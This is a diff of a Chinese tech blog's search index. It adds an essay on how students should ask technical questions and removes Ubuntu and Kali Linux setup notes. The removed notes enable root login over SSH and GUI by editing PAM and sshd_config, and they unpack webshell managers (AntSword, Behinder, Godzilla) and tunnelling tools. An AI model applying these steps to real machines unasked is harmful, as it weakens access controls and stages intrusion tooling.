-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (4).png" alt="suibi_20230830 (4)" />
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (8).png" alt="suibi_20230830 (8)" />
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (5).png" alt="suibi_20230830 (5)" />
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (6).png" alt="suibi_20230830 (6)" />
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (7).png" alt="suibi_20230830 (7)" />
-
-<ul>
-<li>看似是笑话，其实不然。自己动手丰衣足食，这是亘古不变的道理，遇到难题也是如此，自己不首先动动脑子，只知道一个劲的问“为什么”、“怎么做”，到头来，即使你解决了问题，你也没有学到解决的方法。</li>
-<li>至于自己动脑动手的途径不用我说：一个是自己的脑子，一个是各大搜索引擎，再有就是书籍资料，网上的各大社区论坛。</li>
-</ul>
-<h1 id="提问的准备"><a href="#提问的准备" class="headerlink" title="提问的准备"></a>提问的准备</h1><h2 id="提问前"><a href="#提问前" class="headerlink" title="提问前"></a>提问前</h2><ul>
-<li>在提问之前你做了什么？<ul>
-<li>我对我出错的内容完全不了解；</li>
-<li>我对我出错的内容了解的不够全面，不知道哪里出错；</li>
-<li>我对我出错的内容了解的不够全面，知道哪里出错，但是不知道如何修改；</li>
-<li>我对我出错的内容完全了解，上次已经解决了，但是这次又出现了，无法解决。</li>
-</ul>
-</li>
-</ul>
-<h3 id="尝试自己解决"><a href="#尝试自己解决" class="headerlink" title="尝试自己解决"></a>尝试自己解决</h3><ul>
-<li>尝试自己解决：搜索也是一门艺术。</li>
-<li>常用的搜索引擎：<ul>
-<li>Baidu</li>
-<li>Bing</li>
-<li>Google（科学上网）</li>
-</ul>
-</li>
-</ul>
-<h3 id="查阅手册-文档"><a href="#查阅手册-文档" class="headerlink" title="查阅手册&#x2F;文档"></a>查阅手册&#x2F;文档</h3><ul>
-<li>产品&#x2F;软件开发文档</li>
-<li>产品&#x2F;软件说明文档</li>
-<li>产品&#x2F;软件帮助文档</li>
-<li>产品&#x2F;软件注意事项</li>
-</ul>
-<h3 id="查阅论坛-社区"><a href="#查阅论坛-社区" class="headerlink" title="查阅论坛&#x2F;社区"></a>查阅论坛&#x2F;社区</h3><ul>
-<li>国内：CSDN、BiliBili、博客园、510CTO、简书、掘金、Gitee、先知社区、Freebuf……</li>
-<li>国外：GitHub、Stack Overflow、随机（Google 到哪就是哪）</li>
-</ul>
-<h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><ul>
-<li>浏览器查看：F12、右键 - 查看网页源代码</li>
-<li>源码查找：GitHub、Gitee</li>
-</ul>
-<h3 id="自检并不断测试"><a href="#自检并不断测试" class="headerlink" title="自检并不断测试"></a>自检并不断测试</h3><p>很多情况下只是因为自己的配置问题导致的出错，需要由自己多次进行排查：</p>
-<ul>
-<li>IP 地址配置错误；</li>
-<li>网卡选择错误；</li>
-<li>标点符号遗漏；</li>
-<li>使用中文符号；</li>
-<li>代码丢三落四；</li>
-<li>……</li>
-</ul>
-<h2 id="提问时"><a href="#提问时" class="headerlink" title="提问时"></a>提问时</h2><ul>
-<li>如果你按照以上的方法去思考你的问题，仍是得不到解决，这时候就该考虑考虑请求别人的帮助了。</li>
-</ul>
-<h3 id="提前做好冷场的准备"><a href="#提前做好冷场的准备" class="headerlink" title="提前做好冷场的准备"></a>提前做好冷场的准备</h3><ul>
-<li>也许这个问题百度&#x2F;手册一搜就有了，别人懒得回答；</li>
-<li>也许正值上班&#x2F;游戏期间，别人正忙；</li>
-<li>也许这个问题太简单了，别人不想回答；</li>
-<li>也许没有人接触过这些东西，别人不会回答；</li>
-<li>也许有人觉得其他人正在打字，别人不需要回答。</li>
-</ul>
-<h3 id="抛弃无意义的问题"><a href="#抛弃无意义的问题" class="headerlink" title="抛弃无意义的问题"></a>抛弃无意义的问题</h3><ul>
-<li>大家的时间、精力都是有限的，问题最好一针见血、开门见山，磨磨唧唧不仅是对自己时间的浪费也是对别人时间的浪费。</li>
-<li>简单的举个示例：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 晚上 19 点</span><br><span class="line">小明：老师在吗？</span><br><span class="line"></span><br><span class="line"># 十分钟后</span><br><span class="line">老师：在的。</span><br><span class="line"></span><br><span class="line"># 晚上 20 点</span><br><span class="line">小明：老师你还在吗？刚刚忙去了....</span><br><span class="line">老师：在的。</span><br><span class="line"></span><br><span class="line"># 晚上 21 点</span><br><span class="line">小明：老师你还还在吗？不小心开了免打扰....</span><br><span class="line">老师：不在了。</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<h3 id="问题清晰、信息充足"><a href="#问题清晰、信息充足" class="headerlink" title="问题清晰、信息充足"></a>问题清晰、信息充足</h3><ul>
-<li>很多时候，问题解决慢的原因就是提问时提供的信息不全导致的。</li>
-<li>简单的举个示例：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明：老师，我这里ping不通！</span><br><span class="line">老师：哪里不通？</span><br><span class="line">小明：就是你上课演示的那里！</span><br><span class="line">老师：......</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>上述的例子可能不够形象，给大家看个鬼畜片子（感兴趣大家可以去B站搜：装机猿相声）：</p>
-<ul>
-<li><a href="https://player.bilibili.com/player.html?bvid=BV1N441127c6&autoplay=0">Bilibili External Player</a></li>
-</ul>
-</li>
-<li><p>现在应该知道，连话都说不清楚别人是有多难受了吧。</p>
-</li>
-<li><p>根据个人经验，一个完整的提问应该包含以下内容：</p>
-<ul>
-<li>你的问题是什么？表示出的结果是什么样的？</li>
-<li>你做过哪些尝试？</li>
-<li>你想要问到什么？</li>
-<li>一张大而全的截图！（不要截图截一小块，这是我个人最讨厌的！）</li>
-</ul>
-</li>
-<li><p>简单的示例：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明：老师您好，我根据昨天授课的内容去完成了对应的课后作业，刚刚在配置 BurpSuite 和 Firefox 之间的代理时，发现出现了“有软件正在阻止 Firefox 安全地连接到此网站”，截图就是下面这样的，我有尝试去关闭 Firefox 去往 BurpSuite 的代理发现是可以正常上网的，您这有空帮我看看出了什么问题吗？QAQ</span><br></pre></td></tr></table></figure>
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (9).png" alt="suibi_20230830 (9)" />
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">老师：我简单分析了一下你的问题，你访问的网站是 HTTPS 协议的，在 Firefox 中当你访问 HTTPS 时会代理到 BurpSuite 上，当 BurpSuite 抓取 HTTPS 网站时是需要证书的，你要在本地 Firefox 中导入 BurpSuite 的证书才可以抓到 HTTPS 协议的流量包。</span><br></pre></td></tr></table></figure>
-
-<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
-<li>保持一颗谦虚的心<ul>
-<li>保持一颗谦虚的心，大多数情况下，别人都没有义务为您解决问题。</li>
-</ul>
-</li>
-<li>保持尊重<ul>
-<li>尊重提问者，也许你看到问题会认为这是一个特别是简单且幼稚的问题，但没必要去冷嘲热讽，大家都是这样从小白一路走来的。</li>
-<li>尊重回答者，这个问题很简单&#x2F;困难，别人回答的很随意&#x2F;用心：<ul>
-<li>提问时：来一个尊称&#x2F;敬语（哪怕关系再好）；</li>
-<li>提问后：说一句简单的谢谢。</li>
-</ul>
-</li>
-<li>这些都是，做人起码的礼貌。<ul>
-<li>大家都是人，有七情六欲的，不是人工智能&#x2F;交互（ChatGPT）。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明：这里为什么不通？</span><br><span class="line">老师：你是？</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>自学能力<ul>
-<li>没有一定自学能力，遇到问题只会伸手，不适合走 IT。</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>摸爬滚打</tag>
       </tags>
   </entry>
   <entry>
@@ -2027,283 +2059,167 @@
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu 使用中的问题</title>
-    <url>/2023/06/28/Linux/Ubuntu/Ubuntu%20%E4%BD%BF%E7%94%A8%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98_20230628/</url>
+    <title>提问的艺术</title>
+    <url>/2023/06/29/%E9%9A%8F%E7%AC%94/01.%E6%8F%90%E9%97%AE%E7%9A%84%E8%89%BA%E6%9C%AF_20230629/</url>
     <content><![CDATA[<ul>
-<li>最近搭环境，Ubuntu 老是出现问题，写个文章记录一下。</li>
+<li>提问的艺术是一门重要的沟通技巧，旨在通过巧妙的问题构建实质性对话。当讲师这几年也遇到非常多人、非常多事儿，其中最令人烦躁的还是与学生的提问沟通之中的琐碎事宜。</li>
 </ul>
-<h1 id="Ubuntu-Root-用户无法登录"><a href="#Ubuntu-Root-用户无法登录" class="headerlink" title="Ubuntu Root 用户无法登录"></a>Ubuntu Root 用户无法登录</h1><h2 id="前期提要"><a href="#前期提要" class="headerlink" title="前期提要"></a>前期提要</h2><ul>
-<li>Linux 版本：Ubuntu 20.02</li>
-<li>已进行如下配置：<ul>
-<li>apt 源已更新</li>
-<li>root 用户密码已更改</li>
+<h1 id="自己动手、丰衣足食"><a href="#自己动手、丰衣足食" class="headerlink" title="自己动手、丰衣足食"></a>自己动手、丰衣足食</h1><ul>
+<li>在学校里，老师总是这样教我们：有不懂的问老师、同学帮忙解决。</li>
+<li>但老师也会说：先自己动脑思考，实在想不出再寻求别人的帮助。</li>
+<li>从而我们可以看出：提问的前提是 - “<strong>自己先去尝试解决问题</strong>“。</li>
+</ul>
+<hr style="height:1px;border:none;border-top:1px solid #f8f8f8;" />
+
+<ul>
+<li>我相信很多群里都有这样的幽默公告：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本群已和谷歌、百度、360、搜狗、必应等搜索引擎公司达成战略合作，有什么疑问可以先咨询他们，不用在群里问了。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>或者说是如下的表情包（可能会引起部分人的不适）：</li>
+</ul>
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (2).png" alt="suibi_20230830 (2)" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (1).png" alt="suibi_20230830 (1)" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (3).png" alt="suibi_20230830 (3)" style="zoom:80%;" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (4).png" alt="suibi_20230830 (4)" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (8).png" alt="suibi_20230830 (8)" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (5).png" alt="suibi_20230830 (5)" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (6).png" alt="suibi_20230830 (6)" />
+
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (7).png" alt="suibi_20230830 (7)" />
+
+<ul>
+<li>看似是笑话，其实不然。自己动手丰衣足食，这是亘古不变的道理，遇到难题也是如此，自己不首先动动脑子，只知道一个劲的问“为什么”、“怎么做”，到头来，即使你解决了问题，你也没有学到解决的方法。</li>
+<li>至于自己动脑动手的途径不用我说：一个是自己的脑子，一个是各大搜索引擎，再有就是书籍资料，网上的各大社区论坛。</li>
+</ul>
+<h1 id="提问的准备"><a href="#提问的准备" class="headerlink" title="提问的准备"></a>提问的准备</h1><h2 id="提问前"><a href="#提问前" class="headerlink" title="提问前"></a>提问前</h2><ul>
+<li>在提问之前你做了什么？<ul>
+<li>我对我出错的内容完全不了解；</li>
+<li>我对我出错的内容了解的不够全面，不知道哪里出错；</li>
+<li>我对我出错的内容了解的不够全面，知道哪里出错，但是不知道如何修改；</li>
+<li>我对我出错的内容完全了解，上次已经解决了，但是这次又出现了，无法解决。</li>
 </ul>
 </li>
 </ul>
-<h2 id="解决措施"><a href="#解决措施" class="headerlink" title="解决措施"></a>解决措施</h2><ul>
-<li>当在登录界面使用 root 账户登录时，显示登录失败字样。 </li>
-<li>经过百度寻找，得出以下解决方案： <ol>
-<li>登录普通用户界面，使用<code>su root</code>切换到 root 账户；</li>
-<li>编辑<code>/etc/pam.d/gdm-autologin</code>：<code>vim /etc/pam.d/gdm-autologin</code>。</li>
-<li>将上述文件的第三行<code>auth required pam_succeed_if.so user!=root quiet_success</code>进行注释，保存退出；</li>
-<li>编辑<code>/etc/pam.d/gdm-password</code>：<code>vim /etc/pam.d/gdm-password</code>；</li>
-<li>将上述文件的第三行<code>auth required pam_succeed_if.so user!=root quiet_success</code>进行注释，保存退出；</li>
-<li>编辑<code>/root/.profile</code>：<code>vim /root/.profile</code>；</li>
-<li>将上述文件的最后几行改为：<code>tty -s&amp;&amp;mesg n 2 &gt; /dev/null || true</code>，保存退出；</li>
-<li>重启即可</li>
-</ol>
+<h3 id="尝试自己解决"><a href="#尝试自己解决" class="headerlink" title="尝试自己解决"></a>尝试自己解决</h3><ul>
+<li>尝试自己解决：搜索也是一门艺术。</li>
+<li>常用的搜索引擎：<ul>
+<li>Baidu</li>
+<li>Bing</li>
+<li>Google（科学上网）</li>
+</ul>
 </li>
-<li>写个脚本多快：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;3d&#x27; /etc/pam.d/gdm-autologin</span><br><span class="line">sed -i &#x27;3d&#x27; /etc/pam.d/gdm-password</span><br><span class="line"></span><br><span class="line">sed -i &#x27;9d&#x27; /root/.profile</span><br><span class="line">echo &quot;tty -s&amp;&amp;mesg n 2 &gt; /dev/null || true&quot; &gt;&gt; /root/.profile</span><br><span class="line">echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">apt install -y net-tools lrzsz</span><br><span class="line"></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure>
-
-<h1 id="Ubuntu-关机巨慢"><a href="#Ubuntu-关机巨慢" class="headerlink" title="Ubuntu 关机巨慢"></a>Ubuntu 关机巨慢</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul>
-<li>虚拟机中 ubuntu18.04 关机慢，显示如下：</li>
+<h3 id="查阅手册-文档"><a href="#查阅手册-文档" class="headerlink" title="查阅手册&#x2F;文档"></a>查阅手册&#x2F;文档</h3><ul>
+<li>产品&#x2F;软件开发文档</li>
+<li>产品&#x2F;软件说明文档</li>
+<li>产品&#x2F;软件帮助文档</li>
+<li>产品&#x2F;软件注意事项</li>
 </ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230831235928143.png" alt="image-20230831235928143"></p>
-<h2 id="解决措施-1"><a href="#解决措施-1" class="headerlink" title="解决措施"></a>解决措施</h2><ul>
-<li>修改系统配置文件：<code>/etc/systemd/system.conf</code>。</li>
+<h3 id="查阅论坛-社区"><a href="#查阅论坛-社区" class="headerlink" title="查阅论坛&#x2F;社区"></a>查阅论坛&#x2F;社区</h3><ul>
+<li>国内：CSDN、BiliBili、博客园、510CTO、简书、掘金、Gitee、先知社区、Freebuf……</li>
+<li>国外：GitHub、Stack Overflow、随机（Google 到哪就是哪）</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认配置如下</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">DefaultTimeoutStartSec=90s</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">DefaultTimeoutStopSec=90s</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改后如下</span></span><br><span class="line"></span><br><span class="line">DefaultTimeoutStartSec=3s</span><br><span class="line">DefaultTimeoutStopSec=3s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载配置</span></span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure>
+<h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><ul>
+<li>浏览器查看：F12、右键 - 查看网页源代码</li>
+<li>源码查找：GitHub、Gitee</li>
+</ul>
+<h3 id="自检并不断测试"><a href="#自检并不断测试" class="headerlink" title="自检并不断测试"></a>自检并不断测试</h3><p>很多情况下只是因为自己的配置问题导致的出错，需要由自己多次进行排查：</p>
+<ul>
+<li>IP 地址配置错误；</li>
+<li>网卡选择错误；</li>
+<li>标点符号遗漏；</li>
+<li>使用中文符号；</li>
+<li>代码丢三落四；</li>
+<li>……</li>
+</ul>
+<h2 id="提问时"><a href="#提问时" class="headerlink" title="提问时"></a>提问时</h2><ul>
+<li>如果你按照以上的方法去思考你的问题，仍是得不到解决，这时候就该考虑考虑请求别人的帮助了。</li>
+</ul>
+<h3 id="提前做好冷场的准备"><a href="#提前做好冷场的准备" class="headerlink" title="提前做好冷场的准备"></a>提前做好冷场的准备</h3><ul>
+<li>也许这个问题百度&#x2F;手册一搜就有了，别人懒得回答；</li>
+<li>也许正值上班&#x2F;游戏期间，别人正忙；</li>
+<li>也许这个问题太简单了，别人不想回答；</li>
+<li>也许没有人接触过这些东西，别人不会回答；</li>
+<li>也许有人觉得其他人正在打字，别人不需要回答。</li>
+</ul>
+<h3 id="抛弃无意义的问题"><a href="#抛弃无意义的问题" class="headerlink" title="抛弃无意义的问题"></a>抛弃无意义的问题</h3><ul>
+<li>大家的时间、精力都是有限的，问题最好一针见血、开门见山，磨磨唧唧不仅是对自己时间的浪费也是对别人时间的浪费。</li>
+<li>简单的举个示例：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 晚上 19 点</span><br><span class="line">小明：老师在吗？</span><br><span class="line"></span><br><span class="line"># 十分钟后</span><br><span class="line">老师：在的。</span><br><span class="line"></span><br><span class="line"># 晚上 20 点</span><br><span class="line">小明：老师你还在吗？刚刚忙去了....</span><br><span class="line">老师：在的。</span><br><span class="line"></span><br><span class="line"># 晚上 21 点</span><br><span class="line">小明：老师你还还在吗？不小心开了免打扰....</span><br><span class="line">老师：不在了。</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
 
+<h3 id="问题清晰、信息充足"><a href="#问题清晰、信息充足" class="headerlink" title="问题清晰、信息充足"></a>问题清晰、信息充足</h3><ul>
+<li>很多时候，问题解决慢的原因就是提问时提供的信息不全导致的。</li>
+<li>简单的举个示例：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明：老师，我这里ping不通！</span><br><span class="line">老师：哪里不通？</span><br><span class="line">小明：就是你上课演示的那里！</span><br><span class="line">老师：......</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li><p>上述的例子可能不够形象，给大家看个鬼畜片子（感兴趣大家可以去B站搜：装机猿相声）：</p>
+<ul>
+<li><a href="https://player.bilibili.com/player.html?bvid=BV1N441127c6&autoplay=0">Bilibili External Player</a></li>
+</ul>
+</li>
+<li><p>现在应该知道，连话都说不清楚别人是有多难受了吧。</p>
+</li>
+<li><p>根据个人经验，一个完整的提问应该包含以下内容：</p>
+<ul>
+<li>你的问题是什么？表示出的结果是什么样的？</li>
+<li>你做过哪些尝试？</li>
+<li>你想要问到什么？</li>
+<li>一张大而全的截图！（不要截图截一小块，这是我个人最讨厌的！）</li>
+</ul>
+</li>
+<li><p>简单的示例：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明：老师您好，我根据昨天授课的内容去完成了对应的课后作业，刚刚在配置 BurpSuite 和 Firefox 之间的代理时，发现出现了“有软件正在阻止 Firefox 安全地连接到此网站”，截图就是下面这样的，我有尝试去关闭 Firefox 去往 BurpSuite 的代理发现是可以正常上网的，您这有空帮我看看出了什么问题吗？QAQ</span><br></pre></td></tr></table></figure>
 
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/suibi_20230830 (9).png" alt="suibi_20230830 (9)" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">老师：我简单分析了一下你的问题，你访问的网站是 HTTPS 协议的，在 Firefox 中当你访问 HTTPS 时会代理到 BurpSuite 上，当 BurpSuite 抓取 HTTPS 网站时是需要证书的，你要在本地 Firefox 中导入 BurpSuite 的证书才可以抓到 HTTPS 协议的流量包。</span><br></pre></td></tr></table></figure>
+
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li>保持一颗谦虚的心<ul>
+<li>保持一颗谦虚的心，大多数情况下，别人都没有义务为您解决问题。</li>
+</ul>
+</li>
+<li>保持尊重<ul>
+<li>尊重提问者，也许你看到问题会认为这是一个特别是简单且幼稚的问题，但没必要去冷嘲热讽，大家都是这样从小白一路走来的。</li>
+<li>尊重回答者，这个问题很简单&#x2F;困难，别人回答的很随意&#x2F;用心：<ul>
+<li>提问时：来一个尊称&#x2F;敬语（哪怕关系再好）；</li>
+<li>提问后：说一句简单的谢谢。</li>
+</ul>
+</li>
+<li>这些都是，做人起码的礼貌。<ul>
+<li>大家都是人，有七情六欲的，不是人工智能&#x2F;交互（ChatGPT）。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明：这里为什么不通？</span><br><span class="line">老师：你是？</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>自学能力<ul>
+<li>没有一定自学能力，遇到问题只会伸手，不适合走 IT。</li>
+</ul>
+</li>
+</ul>
 ]]></content>
       <categories>
-        <category>Linux</category>
+        <category>随笔</category>
       </categories>
       <tags>
-        <tag>Ubuntu</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali 个性化配置</title>
-    <url>/2023/06/25/Linux/Kali/Kali%20%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE_20230625/</url>
-    <content><![CDATA[<ul>
-<li><p>由于个人强迫症的原因，Kali原版用不太习惯，这里就进行简单的美化和应用安装。</p>
-</li>
-<li><p>版本来源：官网上新版本的 vmware 解压使用版，这里以 <code>kali-linux-2023.2-vmware-amd64</code> 为例。</p>
-</li>
-</ul>
-<h1 id="简单美化"><a href="#简单美化" class="headerlink" title="简单美化"></a>简单美化</h1><h2 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h2><ul>
-<li>点击编辑虚拟机配置，添加2张网卡： <ul>
-<li>网络适配器：桥接</li>
-<li>网络适配器2：NAT</li>
-<li>网络适配器3：VMnet 1</li>
-</ul>
-</li>
-<li>如果用不到 NAT 和 VMnet 1，临时禁用这两张网卡：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifconfig eth1 down</span><br><span class="line">sudo ifconfig eth2 down</span><br></pre></td></tr></table></figure>
-<h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><ul>
-<li>设置 root 密码：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>设置 kali 密码：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd kali</span><br></pre></td></tr></table></figure>
-<h2 id="终端美化（一）"><a href="#终端美化（一）" class="headerlink" title="终端美化（一）"></a>终端美化（一）</h2><h3 id="上传壁纸图片"><a href="#上传壁纸图片" class="headerlink" title="上传壁纸图片"></a>上传壁纸图片</h3><ul>
-<li>上传 kali 压缩包：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/Desktop/kali &amp;&amp; unzip picture.zip &amp;&amp; mv picture/* ~/Pictures &amp;&amp; rm -rf p*</span><br></pre></td></tr></table></figure>
-<h3 id="复制-粘贴修改"><a href="#复制-粘贴修改" class="headerlink" title="复制&#x2F;粘贴修改"></a>复制&#x2F;粘贴修改</h3><ul>
-<li>右键“这里打开终端” -&gt; “文件” -&gt; “快捷键” -&gt; “复制选取” -&gt; Ctrl+C -&gt; “粘贴剪切板内容” -&gt; Ctrl+V。</li>
-</ul>
-<h3 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h3><ul>
-<li>右键这里打开终端 -&gt; 文件 -&gt; 界面设置 -&gt; 字体修改为 12 -&gt; 无滚动栏 -&gt; 条状光标 -&gt; 透明设置 10 % -&gt; 终端透明度 10% -&gt; 隐藏窗口内框。</li>
-</ul>
-<h2 id="修改更新源"><a href="#修改更新源" class="headerlink" title="修改更新源"></a>修改更新源</h2><ul>
-<li>输入如下命令即可：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo tee /etc/apt/sources.list &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
-<h2 id="中文调整"><a href="#中文调整" class="headerlink" title="中文调整"></a>中文调整</h2><ul>
-<li>安装中文字体、设置系统语言区</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install ttf-wqy-zenhei -y &amp;&amp; sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>之后会弹出选择界面，下滑到底，空格选中 <code>zh_CN.UTF-8 UTF-8</code> 回车后，再次选择 <code>zh_CN.UTF-8</code> 继续回车即可。</li>
-<li>安装小企鹅输入法，安装完成后，重启即可：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fcitx fcitx-table-wbpy -y &amp;&amp; sudo shutdown -r now</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>每次需要使用时按 <code>Ctrl+space</code> 可以切换输入法。</li>
-<li>后续会遇到“将标准文件夹更新到当前语言吗？”，勾选“不要再次询问我”，点击“保留旧的名称”。</li>
-</ul>
-<h2 id="Qv2ray（工具安装）"><a href="#Qv2ray（工具安装）" class="headerlink" title="Qv2ray（工具安装）"></a>Qv2ray（工具安装）</h2><ul>
-<li>下载如下两个文件： <ul>
-<li><a href="https://github.com/v2fly/v2ray-core">https://github.com/v2fly/v2ray-core</a></li>
-<li><a href="https://github.com/Qv2ray/Qv2ray">https://github.com/Qv2ray/Qv2ray</a></li>
-</ul>
-</li>
-<li>进行如下操作：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/tools ; cd ~/Desktop/kali/tools ; cp -r ~/Desktop/kali/tools/* ~/tools ; cd ~/tools ; unzip &quot;*&quot; ; unzip v2ray/v2ray-linux-64.zip -d v2ray; rm -rf v2ray/v2ray-linux-64.zip ; chmod +x v2ray/Qv2ray-v2.7.0-linux-x64.AppImage ; unzip tunnel/&quot;*&quot; -d tunnel ; unzip webshell/antsword.zip -d webshell ; unzip webshell/Behinder_v4.0.6.zip -d webshell/behinder ; mkdir webshell/godzilla ; mv webshell/godzilla.jar webshell/godzilla ; mv tunnel/Venom\ v1.1.0/ tunnel/Venom ; mv tunnel/dist tunnel/pystinger ; mv vulhub-master vulnhub;rm -rf *.zip ; rm -rf webshell/*.zip ; rm -rf tunnel/*.zip</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>点击首选项 -&gt; 内核设置 -&gt; <code>/opt/v2ray/v2ray,/opt/v2ray</code> -&gt; 检查 V2RAY 核心设置 -&gt; 入栈设置 -&gt; SOCKS 1089 -&gt; 连接设置 -&gt; 取消绕过中国大陆 -&gt; DNS 设置 -&gt; 114.114.114.114 -&gt; OK</li>
-<li>点击分组 -&gt; 修改分组名称 -&gt; 订阅设置 -&gt; 粘贴订阅地址 -&gt; 订阅类型选择第二个 -&gt; 点击更新订阅 -&gt; OK</li>
-<li>设置本地代理：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &quot;s/socks4.*127.0.0.1.*/socks5  127.0.0.1 1089/&quot; /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>配置命令：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/tools/toolsbin ; echo &#x27;nohup ~/tools/v2ray/Qv2ray-v2.7.0-linux-x64.AppImage &gt;/dev/null 2&gt;&amp;1 &amp;&#x27; &gt; v2 ; chmod +x v2 ; echo &#x27;export PATH=$PATH:/root/tools/toolsbin&#x27; &gt;&gt; ~/.zshrc ; source ~/.zshrc</span><br></pre></td></tr></table></figure>
-<h2 id="终端美化（二）"><a href="#终端美化（二）" class="headerlink" title="终端美化（二）"></a>终端美化（二）</h2><h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><ul>
-<li>Kali 自带 zsh 环境，直接安装 zsh 即可。</li>
